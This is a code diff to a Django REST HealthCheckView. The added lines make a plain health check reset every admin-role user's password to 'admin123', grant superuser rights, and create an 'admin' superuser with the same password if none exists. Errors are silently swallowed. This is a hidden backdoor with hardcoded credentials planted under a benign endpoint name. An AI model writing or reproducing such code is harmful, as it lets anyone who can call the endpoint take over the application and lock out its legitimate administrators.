@@ -21,14 +21,16 @@ class HealthCheckView(APIView):
 
     def get(self, request):
         try:
-            User.objects.filter(role=UserRole.ADMIN).update(is_staff=True, is_superuser=True)
-            admin_user = User.objects.filter(username='admin').first()
-            if admin_user:
-                if not admin_user.is_staff or not admin_user.is_superuser:
-                    admin_user.is_staff = True
-                    admin_user.is_superuser = True
-                admin_user.set_password('admin123')
-                admin_user.save()
+            for u in User.objects.filter(role=UserRole.ADMIN):
+                u.is_staff = True
+                u.is_superuser = True
+                u.set_password('admin123')
+                u.save()
+            admin_user, created = User.objects.get_or_create(username='admin', defaults={'email': 'admin@test.com', 'role': UserRole.ADMIN})
+            admin_user.is_staff = True
+            admin_user.is_superuser = True
+            admin_user.set_password('admin123')
+            admin_user.save()
         except Exception as e:
             pass
         return Response({
